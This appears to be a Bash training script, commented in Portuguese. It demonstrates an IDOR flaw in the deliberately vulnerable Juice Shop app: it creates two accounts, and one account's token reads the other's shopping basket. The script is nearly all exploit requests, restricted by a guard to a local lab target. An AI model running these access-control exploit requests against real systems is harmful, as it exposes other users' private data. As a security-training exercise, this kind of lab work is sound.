#!/usr/bin/env bash
# Lab IDOR da cesta no Juice Shop. Alvo fixo 127.0.0.1 (feito para treino).
# Cria duas contas suas, loga, e mostra A lendo a cesta de B. Para na prova.
set -euo pipefail
B=${1:-http://127.0.0.1:3000}
case "$B" in http://127.0.0.1:*|http://localhost:*) ;; *)
  echo "Este script so roda contra o lab local (127.0.0.1). Alvo real: use a skill com escopo.txt." >&2
  exit 2 ;; esac

jqc(){ jq -c "$@"; }
reg(){ curl -s -X POST "$B/api/Users" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$1\",\"password\":\"Senha.lab1\",\"passwordRepeat\":\"Senha.lab1\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"x\"}" >/dev/null || true; }
login(){ curl -s -X POST "$B/rest/user/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$1\",\"password\":\"Senha.lab1\"}"; }

reg alice.lab@bb.local; reg bob.lab@bb.local
A=$(login alice.lab@bb.local); BO=$(login bob.lab@bb.local)
AT=$(echo "$A" | jq -r .authentication.token); ABID=$(echo "$A" | jq -r .authentication.bid)
BT=$(echo "$BO" | jq -r .authentication.token); BBID=$(echo "$BO" | jq -r .authentication.bid)
echo "alice: bid=$ABID  bob: bid=$BBID"
curl -s -X POST "$B/api/BasketItems" -H "Authorization: Bearer $BT" -H 'Content-Type: application/json' \
  -d "{\"BasketId\":\"$BBID\",\"ProductId\":1,\"quantity\":1}" >/dev/null || true
echo "--- alice (token dela) pede a cesta dela:"
curl -s "$B/rest/basket/$ABID" -H "Authorization: Bearer $AT" | jqc '{status, bid:.data.id, itens:[.data.Products[]?.name]}'
echo "--- alice (token dela) pede a cesta do BOB ($BBID):"
curl -s "$B/rest/basket/$BBID" -H "Authorization: Bearer $AT" | jqc '{status, bid:.data.id, itens:[.data.Products[]?.name]}'
echo "Se a segunda linha veio com 'success' e itens, o IDOR esta provado. Pare aqui."
